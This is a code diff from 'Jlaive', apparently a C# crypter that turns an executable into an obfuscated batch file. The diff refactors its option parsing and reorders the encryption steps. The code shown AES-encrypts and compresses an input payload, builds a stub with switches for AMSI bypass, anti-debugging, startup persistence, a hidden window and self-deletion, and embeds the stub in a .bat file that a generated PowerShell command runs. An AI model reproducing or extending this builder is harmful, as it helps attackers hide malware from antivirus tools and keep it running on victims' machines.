@@ -26,17 +26,35 @@ namespace Jlaive
         {
             if (args.Length < 1) HelpManual();
             else if (args[0] == "help" || args[0] == "--help" || args[0] == "-h") HelpManual();
-
             for (int i = 0; i < args.Length; i++)
             {
-                if (args[i] == "-o" || args[i] == "--output") _output = args[i + 1];
-                else if (args[i] == "-i" || args[i] == "--input") _input = args[i + 1];
-                else if (args[i] == "-ab" || args[i] == "--amsibypass") _amsibypass = true;
-                else if (args[i] == "-ad" || args[i] == "--antidebug") _antidebug = true;
-                else if (args[i] == "-obf" || args[i] == "--obfuscate") _obfuscate = true;
-                else if (args[i] == "-d" || args[i] == "--deleteself") _deleteself = true;
-                else if (args[i] == "-h" || args[i] == "--hidden") _hidden = true;
-                else if (args[i] == "-s" || args[i] == "--startup") _startup = true;
+                switch (args[i])
+                {
+                    case string p when (p == "-o" || p == "--output"):
+                        _output = args[i + 1];
+                        break;
+                    case string p when (p == "-i" || p == "--input"):
+                        _input = args[i + 1];
+                        break;
+                    case string p when (p == "-ab" || p == "--amsibypass"):
+                        _amsibypass = true;
+                        break;
+                    case string p when (p == "-ad" || p == "--antidebug"):
+                        _antidebug = true;
+                        break;
+                    case string p when (p == "-obf" || p == "--obfuscate"):
+                        _obfuscate = true;
+                        break;
+                    case string p when (p == "-d" || p == "--deleteself"):
+                        _deleteself = true;
+                        break;
+                    case string p when (p == "-h" || p == "--hidden"):
+                        _hidden = true;
+                        break;
+                    case string p when (p == "-s" || p == "--startup"):
+                        _startup = true;
+                        break;
+                }
             }
 
             if (!File.Exists(_input))
@@ -58,13 +76,17 @@ namespace Jlaive
             Console.ForegroundColor = ConsoleColor.Gray;
             byte[] pbytes = File.ReadAllBytes(_input);
 
-            Console.WriteLine("Creating .NET stub...");
+            Console.WriteLine("Encrypting payload...");
             AesManaged aes = new AesManaged();
+            byte[] payload_enc = Encrypt(Compress(pbytes), aes.Key, aes.IV);
+
+            Console.WriteLine("Creating stub...");
             string stub = StubGen.CreateCS(aes.Key, aes.IV, _amsibypass, _antidebug, _startup, rng);
-            string tempfile = Path.GetTempFileName();
-            Console.WriteLine("Compiling stub...");
-            File.WriteAllText("payload.txt", Convert.ToBase64String(Encrypt(Compress(pbytes), aes.Key, aes.IV)));
             aes.Dispose();
+
+            Console.WriteLine("Compiling stub...");
+            string tempfile = Path.GetTempFileName();
+            File.WriteAllText("payload.txt", Convert.ToBase64String(payload_enc));
             CSharpCodeProvider csc = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
             {
@@ -90,7 +112,7 @@ namespace Jlaive
 
             Console.WriteLine("Encrypting stub...");
             aes = new AesManaged();
-            byte[] encrypted = Encrypt(Compress(stubbytes), aes.Key, aes.IV);
+            byte[] stub_enc = Encrypt(Compress(stubbytes), aes.Key, aes.IV);
 
             Console.WriteLine("Creating PowerShell command...");
             string command = StubGen.CreatePS(aes.Key, aes.IV, _hidden, rng);
@@ -112,7 +134,7 @@ namespace Jlaive
             output.AppendLine("del \"%~dp0%~nx0.exe\"");
             if (_deleteself) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
             output.AppendLine("exit /b");
-            output.Append(Convert.ToBase64String(encrypted));
+            output.Append(Convert.ToBase64String(stub_enc));
 
             Console.WriteLine("Writing output...");
             _output = Path.ChangeExtension(_output, "bat");
